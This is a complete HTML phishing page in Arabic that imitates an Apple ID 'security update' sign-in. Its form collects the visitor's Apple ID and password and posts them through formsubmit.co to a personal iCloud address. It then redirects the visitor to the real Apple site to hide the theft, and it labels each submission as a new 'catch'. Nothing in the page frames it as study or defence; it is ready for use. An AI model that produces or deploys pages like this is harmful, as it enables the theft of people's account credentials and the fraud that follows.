<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث أمان Apple</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
        img { width: 45px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 10px; }
        p { color: #6e6e73; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 17px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background-color: #0071e3; color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
        <h1>Apple ID</h1>
        <p>قم بتسجيل الدخول لمتابعة تحديث الأمان</p>
        
        <form action="https://formsubmit.co/Faleh370@icloud.com" method="POST">
            <input type="email" name="AppleID" placeholder="Apple ID" required>
            <input type="password" name="Password" placeholder="كلمة السر" required>
            <button type="submit">متابعة</button>
            
            <input type="hidden" name="_next" value="https://appleid.apple.com">
            <input type="hidden" name="_subject" value="صيد جديد من موقع فالح الهاجري!">
        </form>
    </div>
</body>
</html>
